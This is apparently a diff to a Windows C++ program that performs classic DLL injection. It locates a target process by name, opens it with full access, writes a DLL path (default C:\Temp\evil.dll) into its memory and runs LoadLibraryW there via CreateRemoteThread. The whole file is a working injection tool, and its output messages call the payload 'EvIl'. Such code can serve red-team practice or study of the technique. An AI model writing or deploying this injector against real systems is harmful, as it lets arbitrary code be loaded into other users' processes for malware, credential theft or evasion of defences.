@@ -4,6 +4,9 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <vector>
+#include <string>
+
+#define EXIT_WITH_ERROR( e ) { fprintf(stderr,"*** %s Error=%d  *** \n", e, GetLastError() ); exit(-1); }
 
 std::wstring stringToWString(const std::string& s)
 {
@@ -12,96 +15,120 @@ std::wstring stringToWString(const std::string& s)
     return temp;
 }
 
-int main(int argc, char *argv[])
+//Function that searches the pid of the process 
+DWORD processID(const std::string name) 
 {
-    fprintf(stderr, "**** Hello in Classic Dll Injection  ! **** \n");
-
-    HANDLE processHandle;
-    PVOID remoteBuffer;
-    wchar_t dllPath[] = TEXT("C:\\Temp\\evil.dll");
-    struct stat buffer;
-    char temp[30];
     std::vector<DWORD> pids;
 
-    sprintf_s(temp, 30, "%ls", dllPath);
-    
-    if (stat(temp, &buffer) != 0) {
-        fprintf(stderr, " C:\\Temp\\evil.dll not found ! \n");
-        exit(-1);
-    }
-
-    /* STEP 0 : Search pid of target process */
-
-    fprintf(stderr, " **** Searching PID for the processus : %s ****\n", argv[1]);
+    fprintf(stderr, " **** Searching PID for the processus : %s ****\n", name);
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //snapshot of all processus
 
     PROCESSENTRY32 currentProcess;
     currentProcess.dwSize = sizeof currentProcess;
 
-    if (!Process32FirstW(snapshot, &currentProcess)) {
-        fprintf(stderr, "Process32FirstW fail ! \n");
-        exit(-1);
-    }
+    if (!Process32FirstW(snapshot, &currentProcess))
+        EXIT_WITH_ERROR("Process32FirstW fail !");
 
     do {
-        if (std::wstring(currentProcess.szExeFile) == stringToWString(argv[1])) {
+        if (std::wstring(currentProcess.szExeFile) == stringToWString(name)) {
             pids.emplace_back(currentProcess.th32ProcessID);
             fprintf(stderr, " **** Process find ! pid : %d  , ppid : %d ****\n", currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
         }
     } while (Process32NextW(snapshot, &currentProcess));
 
-    if (pids.empty()) {
-        fprintf(stderr, "**** Process not found ! **** \n");
-        exit(-1);
+    if (pids.empty()) 
+        EXIT_WITH_ERROR("Process not found !");
+
+    return pids[0];
+
+}
+
+
+int main(int argc, char *argv[])
+{
+    HANDLE handleProcess;
+    PVOID remoteBuffer;
+    wchar_t dllPath[31];
+    struct stat buffer;
+    char temp[19] = "C:\\Temp\\evil.dll";
+    DWORD pid;
+
+    fprintf(stderr, "**** Hello in Classic Dll Injection  ! **** \n");
+    
+    //USAGE :  injectDll.exe <target.exe> <dllPath> or injectDll.exe <target.exe> <dllPath>
+    
+    if (argc == 1 || argc >=4 ) {
+
+        EXIT_WITH_ERROR("You are missing an input | Usage : injectDll.exe <target.exe> or injectDll.exe <target.exe> <dllPath> ");
+
+    }
+    else if (argc == 3) {
+        fprintf(stderr, "Use  DLLPATH : %s \n",argv[2]);
+
+        if (stat(argv[2], &buffer) != 0) {
+            fprintf(stderr, "%s not found ! \n", argv[2]);
+            exit(-1);
+        }
+
+        mbstowcs_s(NULL, dllPath, strlen(argv[2]) + 1, argv[2], strlen(argv[2]));
+
+    }
+    else  {
+
+        fprintf(stderr, "Use default DLLPATH : C:\\Temp\\evil.dll \n");
+       
+        if (stat(temp, &buffer) != 0) {
+            fprintf(stderr, "%s not found ! \n", temp);
+            exit(-1);
+        }
+
+        mbstowcs_s(NULL, dllPath, strlen(temp) + 1, temp, strlen(temp));
     }
 
-    fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n", pids[0]);
+
+    /* STEP 0 : Search pid of target process */
+
+    pid = processID(argv[1]);
+
+    fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n",pid);
 
     /* STEP 1 : Get process handle */
 
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[0]); 
+    handleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
-    if (processHandle == NULL) {
-        fprintf(stderr, "Error processHandle !\n ");
-        exit(-1);
-    }
+    if (!handleProcess)
+        EXIT_WITH_ERROR("Error processHandle !");
 
     /* STEP 2 : Allocation virtual memory in the target */
 
-    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+    remoteBuffer = VirtualAllocEx(handleProcess, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    
-    if (remoteBuffer == NULL) {
-        fprintf(stderr, "Error remoteBuffer !\n ");
-        exit(-1);
-    }
+    if (!remoteBuffer)
+        EXIT_WITH_ERROR("Error remoteBuffer !");
 
    /* STEP 3 : Write DLL path to allocated memory & Get address of LoadLibrary */
 
-    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+    WriteProcessMemory(handleProcess, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
 
 
-    HMODULE module = GetModuleHandle(TEXT("Kernel32"));
+    HMODULE hmodule = GetModuleHandle(TEXT("Kernel32"));
 
-    if (module == 0) {
-        fprintf(stderr, "GetModuleHandle error ! \n");
-        exit(-1);
-    }
+    if (!hmodule)
+        EXIT_WITH_ERROR("GetModuleHandle error");
 
     /* STEP 4 : Load the DLL and launch thread for execute the DLL */
 
-    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(module, "LoadLibraryW");
+    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hmodule, "LoadLibraryW");
 
-    if (threatStartRoutineAddress == NULL) {
-        fprintf(stderr,"Error threatStartRoutineAddress !\n ");
-        exit(-1);
-    }
+    if (!threatStartRoutineAddress)
+        EXIT_WITH_ERROR("Error threatStartRoutineAddress");
 
-    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+    CreateRemoteThread(handleProcess, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
 
-    CloseHandle(processHandle);
+    CloseHandle(handleProcess);
 
-    fprintf(stderr, "***** GoodBye ! EvIl *****\n");
+    fprintf(stderr, "***** Succes, GoodBye ! EvIl *****\n");
     return 0;
 }
 
